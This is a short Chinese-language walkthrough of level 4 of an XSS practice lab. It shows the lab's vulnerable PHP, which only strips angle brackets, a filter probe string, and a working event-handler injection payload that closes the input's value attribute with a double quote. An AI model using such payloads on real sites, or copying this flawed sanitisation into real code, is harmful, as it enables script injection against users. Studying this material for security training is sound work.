# Level-4 （删<>绕 + 事件注入）

## 万能探针

先扔进去看过滤情况：

```
<SCRscriptIPT>'"()Oonnjavascript
```

## 查看分析源码

```php
$str = $_GET["keyword"];
$str2 = str_replace(">","",$str);   // 删 >
$str3 = str_replace("<","",$str2);  // 删 <
echo "...".htmlspecialchars($str)."...";
echo "<input name=keyword  value=\"".$str3."\">";
```

和第 3 关思路一样，但过滤方式换了——不是 htmlspecialchars 转义，是直接**删掉 `<>`**

删得不干净：删完就没了，但 `"` `'` 没处理

所以还是事件注入，换双引号闭合

## 构造 payload

```
" onfocus="alert(1)" autofocus="
```
![](99_Attachments/图片/level4/file-20260616201513884.png)
## 闭合原理

`<>` 被删？payload 里一个 `<` `>` 都没用：

```html
<input name=keyword value="" onfocus="alert(1)" autofocus="">
                         ↑__↑ ↑______________________↑ ↑__↑
                      关value   onfocus事件            收尾
```

和第 3 关对比：3 关是 htmlspecialchars 不转义单引号 → 用 `'` 闭合；这关是删 `<>` 不动引号 → 用 `"` 闭合。
